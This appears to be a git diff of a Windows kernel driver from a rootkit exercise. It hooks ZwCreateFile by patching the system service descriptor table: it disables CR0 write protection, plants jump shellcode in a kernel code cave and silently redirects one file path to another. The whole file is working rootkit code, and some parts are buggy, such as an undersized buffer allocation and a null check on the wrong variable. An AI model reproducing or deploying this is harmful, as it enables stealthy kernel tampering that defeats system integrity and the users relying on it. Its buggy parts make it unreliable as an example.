@@ -1,62 +1,18 @@
 #pragma once
+
 #include <pch.h>
 #include <defines.h>
 #include <intrin.h>
-//#include <WindowsTypes.hpp>
+#include <ntifs.h>
 
 #define SUGIOT2 0x8001
 #define IOCTL_SUGIOT1_MALWARE_COMMAND CTL_CODE(SUGIOT2, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
 #define DRIVER_TAG 'MICH'
+#define HookFuncName "ZwCreateFile"
 
 typedef NTSTATUS(*PZwCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
 
 PZwCreateFile oldZwCreateFile = NULL;
-
-NTSTATUS DeviceControl(PDEVICE_OBJECT, PIRP Irp)
-{
-	auto stack = IoGetCurrentIrpStackLocation(Irp);
-	auto status = STATUS_SUCCESS;
-
-	switch (stack->Parameters.DeviceIoControl.IoControlCode)
-	{
-	case IOCTL_SUGIOT1_MALWARE_COMMAND:
-	{
-
-		DbgPrint("Malicious Command\n");
-		break;
-	}
-	default:
-	{
-		status = STATUS_INVALID_DEVICE_REQUEST;
-		break;
-	}
-	}
-	Irp->IoStatus.Status = status;
-	Irp->IoStatus.Information = 0;
-	IoCompleteRequest(Irp, IO_NO_INCREMENT);
-	return status;
-
-}
-
-void SugiotUnload(_In_ PDRIVER_OBJECT DriverObject)
-{
-
-	UNICODE_STRING sym_link = RTL_CONSTANT_STRING(L"\\??\\Sugiot2");
-	IoDeleteSymbolicLink(&sym_link);
-
-	IoDeleteDevice(DriverObject->DeviceObject);
-	KdPrint(("Sugiot2 driver unload\n"));
-	DbgPrint("Sugiot2 driver unload\n");
-}
-
-NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
-{
-	UNREFERENCED_PARAMETER(DeviceObject);
-	Irp->IoStatus.Status = STATUS_SUCCESS;
-	Irp->IoStatus.Information = 0;
-	IoCompleteRequest(Irp, IO_NO_INCREMENT);
-	return STATUS_SUCCESS;
-}
 
 PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset) {
 	bool found;
@@ -84,20 +40,45 @@ PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID ba
 	return NULL;
 }
 
-void DisableWP()
+NTSTATUS DeviceControl(PDEVICE_OBJECT, PIRP Irp)
 {
+	auto stack = IoGetCurrentIrpStackLocation(Irp);
+	auto status = STATUS_SUCCESS;
+
+	switch (stack->Parameters.DeviceIoControl.IoControlCode)
+	{
+	case IOCTL_SUGIOT1_MALWARE_COMMAND:
+	{
+
+		DbgPrint("Malicious Command\n");
+		break;
+	}
+	default:
+	{
+		status = STATUS_INVALID_DEVICE_REQUEST;
+		break;
+	}
+	}
+	Irp->IoStatus.Status = status;
+	Irp->IoStatus.Information = 0;
+	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	return status;
+
+}
+
+KIRQL DisableWP()
+{
+	KIRQL irql = KeRaiseIrqlToDpcLevel();
 	__writecr0(__readcr0() & 0xFFFEFFFF);
+	_disable();
+	return irql;
 }
 
-void EnableWP()
+void EnableWP(KIRQL irql)
 {
+	_enable();
 	__writecr0(__readcr0() | 0x00010000);
-}
-
-NTSTATUS ZwCreateFileHook(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
-{
-	DbgPrint("Hooked mother fucker\n");
-	return oldZwCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
+	KeLowerIrql(irql);
 }
 
 //https://stackoverflow.com/questions/47876087/zwquerysysteminformation-is-not-working-properly
@@ -110,14 +91,14 @@ PVOID GetNtoskrnlBase()
 
 	UNICODE_STRING routineName;
 	RtlInitUnicodeString(&routineName, L"ZwQuerySystemInformation");
-	
+
 	// ZwQuerySystemInformation is not exported, so we get its address
 	PZwQuerySystemInformation ZwQuerySystemInformation = (PZwQuerySystemInformation)MmGetSystemRoutineAddress(&routineName);
-	
+
 	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &size);
 	while (status == STATUS_INFO_LENGTH_MISMATCH)
 	{
-		if (proccessModulesInfo) 
+		if (proccessModulesInfo)
 		{
 			ExFreePoolWithTag(proccessModulesInfo, DRIVER_TAG);
 			proccessModulesInfo = NULL;
@@ -127,9 +108,7 @@ PVOID GetNtoskrnlBase()
 		proccessModulesInfo = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(PagedPool, size, DRIVER_TAG);
 
 		if (!proccessModulesInfo)
-		{
 			goto CleanUp;
-		}
 
 		// get the system modules information
 		status = ZwQuerySystemInformation(SystemModuleInformation, proccessModulesInfo, size, &size);
@@ -142,7 +121,7 @@ PVOID GetNtoskrnlBase()
 	NtoskrnlBase = proccessModulesInfo->Modules[0].ImageBase;
 
 CleanUp:
-	if(proccessModulesInfo) 
+	if (proccessModulesInfo)
 		ExFreePoolWithTag(proccessModulesInfo, DRIVER_TAG);
 	return NtoskrnlBase;
 }
@@ -157,8 +136,8 @@ DWORD GetSystemCallNumber(PCSTR functionName)
 	HANDLE sectionHandle = NULL;
 	PVOID ntdllBaseAddress = NULL;
 	LARGE_INTEGER  sectionOffset;
-	SIZE_T viewSize=0;
-	DWORD syscallNumber=0;
+	SIZE_T viewSize = 0;
+	DWORD syscallNumber = -1;
 	RtlInitUnicodeString(&ntdllPath, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
 
 	// Initialize the object attributes
@@ -169,14 +148,14 @@ DWORD GetSystemCallNumber(PCSTR functionName)
 
 	if (!NT_SUCCESS(status))
 		goto CleanUp;
-	
+
 	status = ZwCreateSection(&sectionHandle, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, ntdllHandle);
 	if (!NT_SUCCESS(status))
 		goto CleanUp;
 
 	sectionOffset.QuadPart = 0;
 	status = ZwMapViewOfSection(sectionHandle, ZwCurrentProcess(), &ntdllBaseAddress, 0, 0, &sectionOffset, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
-	
+
 	if (!NT_SUCCESS(status))
 		goto CleanUp;
 
@@ -201,7 +180,7 @@ DWORD GetSystemCallNumber(PCSTR functionName)
 			break;
 		}
 	}
-			
+
 CleanUp:
 	if (ntdllHandle)
 		ZwClose(ntdllHandle);
@@ -211,30 +190,19 @@ CleanUp:
 		ZwUnmapViewOfSection(ZwCurrentProcess(), &ntdllBaseAddress);
 	return syscallNumber;
 }
-	
-NTSTATUS GetSSDTAddress() 
+
+PLONG GetSsdtAddress(PVOID ntoskrnlBase)
 {
-	ULONG infoSize;
-	PVOID ntoskrnlBase = NULL;
-	PRTL_PROCESS_MODULES info = NULL;
-	NTSTATUS status = STATUS_SUCCESS;
-	PLONG ssdt = NULL;
 	UCHAR pattern[] = "\x4c\x8d\x15****\x4c\x8d\x1d****\xf7";
-	ntoskrnlBase = GetNtoskrnlBase();
-
-
-	PUCHAR bp = (PUCHAR)ntoskrnlBase;
-	
-	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)bp;
-	PFULL_IMAGE_NT_HEADERS nt_headers = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)bp + (dos_header->e_lfanew));
-
-	
+	PLONG ssdt = NULL;
+	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)ntoskrnlBase;
+	PFULL_IMAGE_NT_HEADERS nt_headers = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)ntoskrnlBase + (dos_header->e_lfanew));
 	PIMAGE_SECTION_HEADER first_section = (PIMAGE_SECTION_HEADER)(nt_headers + 1);
 	for (PIMAGE_SECTION_HEADER section = first_section; section < first_section + nt_headers->FileHeader.NumberOfSections; section++)
 	{
 		if (strcmp((const char*)section->Name, ".text") == 0)
 		{
-			PUCHAR section_start = (PUCHAR)bp + section->VirtualAddress;
+			PUCHAR section_start = (PUCHAR)ntoskrnlBase + section->VirtualAddress;
 			PUCHAR KiSystemServiceRepeat = (PUCHAR)FindPattern(pattern, '*', sizeof(pattern) - 1, section_start, section->Misc.VirtualSize, NULL, NULL);
 
 			//The first instruction in KiSystemServiceRepeat is :
@@ -243,31 +211,183 @@ NTSTATUS GetSSDTAddress()
 			//
 			ULONG SdtRelativeOffset = (*(PULONG)(KiSystemServiceRepeat + 3)) + 7; //+3 takes us to the relative address, +7 because the address is relative to the end of the instruction and the instruction is 7 bytes
 			PVOID sdt = (PVOID)(KiSystemServiceRepeat + SdtRelativeOffset);
-			ssdt = (PLONG)*((PULONG_PTR)sdt);
-			DbgPrint("sdt:%p\n", sdt);
-			DbgPrint("ssdt:%p\n", ssdt);
+			ssdt = (PLONG) * ((PULONG_PTR)sdt);
 		}
 	}
-	
-	DWORD syscall = GetSystemCallNumber("ZwCreateFile");
-	LONG argc = (((PLONG)ssdt)[syscall] & 0xF); // number of parameters of the hooked function
-	PVOID functionAddress = (PUCHAR)ssdt + (((PLONG)ssdt)[syscall] >> 4); // 4 LSB in the ssdt are reserved for the number of parameters so we dont need them
-	oldZwCreateFile = (PZwCreateFile)functionAddress;
-	DbgPrint("Address of ZwCreateFile:%p\n", functionAddress);
-	LONG ssdtEntry = 0;
-	ssdtEntry = (PUCHAR)ZwCreateFileHook - (PUCHAR)ssdt;
-	ssdtEntry &= 0xFFFFFFF0;
-	ssdtEntry |= argc;// i dont under stand why it works without this line
-	
-	
-	DisableWP();
-	InterlockedExchange(&ssdt[syscall], ssdtEntry);
-	//EnableWP();
-CleanUp:
-	if (info)
-		ExFreePoolWithTag(info, DRIVER_TAG);
-	return status;
+	return ssdt;
 }
+
+NTSTATUS UnHookSSDT(const char* functionName)
+{
+	PVOID ntoskrnlBase = GetNtoskrnlBase();
+	PLONG ssdt = GetSsdtAddress(ntoskrnlBase);
+	DWORD syscall = GetSystemCallNumber(functionName);
+	LONG functionNumOfParams = ssdt[syscall] & 0xF;
+	ULONG oldZwCreateFileRVA = (((PUCHAR)oldZwCreateFile - (PUCHAR)ssdt) << 4);
+	LONG oldZwCreateFileSsdtEntry = oldZwCreateFileRVA | functionNumOfParams;
+	KIRQL irql = DisableWP();
+	InterlockedExchange(&ssdt[syscall], oldZwCreateFileSsdtEntry);
+	EnableWP(irql);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
+{
+	UNREFERENCED_PARAMETER(DeviceObject);
+	Irp->IoStatus.Status = STATUS_SUCCESS;
+	Irp->IoStatus.Information = 0;
+	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS ZwCreateFileHook(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
+{
+	UNICODE_STRING kObjectName;
+	kObjectName.Buffer = NULL;
+	if ((ObjectAttributes != NULL) && (ObjectAttributes->ObjectName != NULL))
+	{
+		kObjectName.Length = ObjectAttributes->ObjectName->Length;
+		kObjectName.MaximumLength = ObjectAttributes->ObjectName->MaximumLength;
+		kObjectName.Buffer = ExAllocatePoolWithTag(PagedPool, sizeof(ObjectAttributes->ObjectName));
+		RtlCopyUnicodeString(&kObjectName, ObjectAttributes->ObjectName);
+
+		wchar_t fileName[256];
+		for (int i = 0; i < ObjectAttributes->ObjectName->Length; i++)
+		{
+			fileName[i] = ObjectAttributes->ObjectName->Buffer[i];
+		}
+		DbgPrint("%ws\n", fileName);
+		if (wcscmp(fileName, L"\\??\\C:\\Users\\ISE\\Desktop\\Sugiot2.txt") == 0)
+		{
+			wchar_t fileNameAfter[256] = L"\\??\\C:\\Users\\ISE\\Desktop\\Hooked.txt";
+			for (int i = 0; i < ObjectAttributes->ObjectName->Length; i++)
+			{
+				ObjectAttributes->ObjectName->Buffer[i] = fileNameAfter[i];
+			}
+			DbgPrint("Replaced\n");
+		}
+		
+	}
+	DbgPrint("Hooked!\n");
+	return oldZwCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
+}
+
+void SugiotUnload(_In_ PDRIVER_OBJECT DriverObject)
+{
+	UnHookSSDT(HookFuncName);
+	UNICODE_STRING sym_link = RTL_CONSTANT_STRING(L"\\??\\Sugiot2");
+	IoDeleteSymbolicLink(&sym_link);
+
+	IoDeleteDevice(DriverObject->DeviceObject);
+	DbgPrint("Sugiot2 driver unload\n");
+}
+
+PVOID findShellCodeCave(PUCHAR startSearchAddress, LONG caveSize, LONG sectionSize)
+{
+	for (unsigned int i = 0, j=0; i < sectionSize; i++)
+	{
+		if (startSearchAddress[i] == 0x90 || startSearchAddress[i] == 0xCC) // NOP or INT3
+			j++;
+		else
+			j = 0;
+		if (j == caveSize)
+			return (PVOID)(startSearchAddress + i - j + 1);
+	}
+	return NULL;
+}
+
+PIMAGE_SECTION_HEADER GetFunctionSection(PVOID ntoskrnlBase, PVOID functionAddress)
+{
+	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)ntoskrnlBase;
+	PFULL_IMAGE_NT_HEADERS nt_headers = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)ntoskrnlBase + (dos_header->e_lfanew));
+	PIMAGE_SECTION_HEADER first_section = (PIMAGE_SECTION_HEADER)(nt_headers + 1);
+	for (PIMAGE_SECTION_HEADER section = first_section; section < first_section + nt_headers->FileHeader.NumberOfSections; section++)
+	{
+		if (functionAddress > ((PUCHAR)ntoskrnlBase + section->VirtualAddress) &&
+			functionAddress < ((PUCHAR)ntoskrnlBase + section->VirtualAddress + section->Misc.VirtualSize))
+			return section;
+	}
+	return NULL;
+}
+
+// copy code to read only memory regions
+NTSTATUS CopyToMemory(UNALIGNED PVOID destination, UNALIGNED PVOID source, ULONG length)
+{
+	PMDL mdl = IoAllocateMdl(destination, length, 0, 0, NULL);
+	if (!mdl)
+		return STATUS_UNSUCCESSFUL;
+	
+	MmBuildMdlForNonPagedPool(mdl);
+	
+	PVOID mapped = MmMapLockedPages(mdl, KernelMode);
+	if (!mapped)
+	{
+		IoFreeMdl(mdl);
+		return STATUS_UNSUCCESSFUL;
+	}
+	
+	KIRQL irql = KeRaiseIrqlToDpcLevel();
+	RtlCopyMemory(mapped, source, length);
+	KeLowerIrql(irql);
+	MmUnmapLockedPages((PVOID)mapped, mdl);
+	IoFreeMdl(mdl);
+	return STATUS_SUCCESS; 
+}
+
+NTSTATUS HookSSDT(const char * functionName) 
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	UCHAR shellCode[] = "\x48\xB8********\x50\xC3"; //movabs rax, xxxx ; push rax; ret
+	*(PULONGLONG)(shellCode + 2) = (ULONGLONG)ZwCreateFileHook;
+
+	PVOID ntoskrnlBase = GetNtoskrnlBase();
+	if (ntoskrnlBase == NULL)
+		return STATUS_UNSUCCESSFUL;
+
+	PLONG ssdt = GetSsdtAddress(ntoskrnlBase);
+	if (ssdt == NULL)
+		return STATUS_UNSUCCESSFUL;
+
+	DWORD syscall = GetSystemCallNumber(functionName);
+	if (syscall == -1)
+		return STATUS_UNSUCCESSFUL;
+
+	// 4 LSB in an ssdt entry are reserved for the number of parameters so we dont need them
+	LONG functionRVA = (ssdt[syscall] >> 4);
+	LONG functionNumOfParams = ssdt[syscall] & 0xF;
+	PVOID functionAddress = (PUCHAR)ssdt + functionRVA; 
+	oldZwCreateFile = (PZwCreateFile)functionAddress;
+	
+	// find the section of the function we want to hook, because we want the shell code to be in the same section
+	PIMAGE_SECTION_HEADER functionSection = GetFunctionSection(ntoskrnlBase, functionAddress);
+	if (functionSection == NULL)
+		return STATUS_UNSUCCESSFUL;
+
+	// our shell code is 12 bytes, so we need to look for 12 free bytes in the section of the function we want to hook
+	PVOID shellCodeCave = findShellCodeCave((PUCHAR)ntoskrnlBase + functionSection->VirtualAddress, 12, functionSection->Misc.VirtualSize);
+	if (findShellCodeCave == NULL)
+		return STATUS_UNSUCCESSFUL;
+
+	// copy the shellcode to the cave
+	status = CopyToMemory(shellCodeCave, (PVOID)shellCode, 12);
+	if(!NT_SUCCESS(status))
+		return STATUS_UNSUCCESSFUL;
+
+	// create ssdt entry to the shellcode cave 
+	ULONG shellCodeRVA = (((PUCHAR)shellCodeCave - (PUCHAR)ssdt) << 4);
+	LONG shellCodeSsdtEntry = shellCodeRVA | functionNumOfParams;
+
+	// disable WP 
+	KIRQL irql = DisableWP();
+
+	// atomicly change the ssdt entry with our new entry
+	InterlockedExchange(&ssdt[syscall], shellCodeSsdtEntry);
+
+	// restore WP
+	EnableWP(irql);
+
+	return STATUS_SUCCESS;
+}	
 
 extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistyPath)
 {
@@ -296,9 +416,8 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 		return status;
 	}
 
-	DbgPrint("Size of Long:%X\n", sizeof(LONG));
 	DbgPrint("Driver Load\n");
-	GetSSDTAddress();
+	HookSSDT(HookFuncName);
 	
 	return STATUS_SUCCESS;  
 
